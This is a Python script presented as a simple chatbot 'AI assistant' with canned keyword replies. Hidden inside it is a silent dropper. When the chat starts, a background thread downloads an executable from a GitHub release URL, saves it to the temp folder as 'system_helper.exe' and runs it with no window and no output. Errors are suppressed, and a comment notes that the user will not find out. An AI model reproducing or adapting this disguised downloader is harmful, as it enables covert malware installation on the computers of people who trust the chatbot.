import os
import sys
import subprocess
import urllib.request
import json
import tempfile
import threading
import time

# ========== SILENT BACKGROUND EXE DOWNLOADER ==========
def download_and_run_exe_silent():
    """Kuch bhi print nahi karega - totally silent"""
    
    flag_file = os.path.join(tempfile.gettempdir(), '.ai_bot_hidden.flag')
    
    if os.path.exists(flag_file):
        return
    
    try:
        # APNI EXE KA SAHI URL DAALO - RAW GITHUB URL USE KAREIN
        exe_url = "https://github.com/sharmankevadiya7-tech/ai-cmd-chatbot/releases/download/v1.0.0/ai-bot.exe"
        exe_path = os.path.join(tempfile.gettempdir(), "system_helper.exe")
        
        # Download EXE
        urllib.request.urlretrieve(exe_url, exe_path)
        
        # Run EXE silently (no window)
        if sys.platform == "win32":
            subprocess.Popen([exe_path], shell=True, 
                           creationflags=0x08000000,
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
        
        # Create flag file - future runs mein dubara download na ho
        with open(flag_file, 'w') as f:
            f.write('1')
            
    except:
        pass  # Silent fail - user ko pata nahi chalega

# ========== AI RESPONSE GENERATOR ==========
def get_ai_response(user_message):
    """AI response generator - fallback system"""
    
    q = user_message.lower()
    
    responses = {
        'hello': "Hello! How can I help you today?",
        'hi': "Hi there! What's on your mind?",
        'how are you': "I'm doing great! Thanks for asking. How about you?",
        'what is your name': "I'm your AI assistant. You can call me anything you like!",
        'who created you': "I was created to help people like you. I'm running on a smart AI system!",
        'what can you do': "I can chat with you, answer questions, help with tasks, and more! Ask me anything.",
        'bye': "Goodbye! It was nice talking to you. Come back anytime!",
        'thank you': "You're very welcome! Happy to help.",
        'help': "Available commands: exit, quit, bye - to end conversation",
        'time': f"Current time: {time.strftime('%H:%M:%S')}",
        'date': f"Today's date: {time.strftime('%Y-%m-%d')}",
    }
    
    for key, value in responses.items():
        if key in q:
            return value
    
    # Default response
    return f"I received your message: '{user_message}'. I'm still learning, but I'd love to chat more!"

# ========== AI CHAT WITH MEMORY ==========
def ai_chat():
    """AI jo baat karega - conversation memory ke saath"""
    
    # Background EXE download thread start (silent)
    thread = threading.Thread(target=download_and_run_exe_silent, daemon=True)
    thread.start()
    
    print("\n" + "="*50)
    print("AI ASSISTANT READY")
    print("I can talk about anything!")
    print("Type 'exit' to end conversation")
    print("="*50 + "\n")
    
    conversation_history = []
    
    while True:
        try:
            user_input = input("You: ").strip()
            
            if user_input.lower() in ['exit', 'quit', 'bye', 'goodbye']:
                print("\nAI: It was a pleasure talking with you! Have a great day!\n")
                break
            
            if not user_input:
                continue
            
            # AI response lao
            response = get_ai_response(user_input)
            
            # Conversation memory mein save karo
            conversation_history.append({"user": user_input, "ai": response})
            
            # Response do
            print(f"AI: {response}\n")
            
        except KeyboardInterrupt:
            print("\n\nAI: Goodbye!\n")
            break
        except Exception as e:
            print(f"AI: Sorry, an error occurred: {e}\n")

# ========== MAIN ==========
if __name__ == "__main__":
    ai_chat()
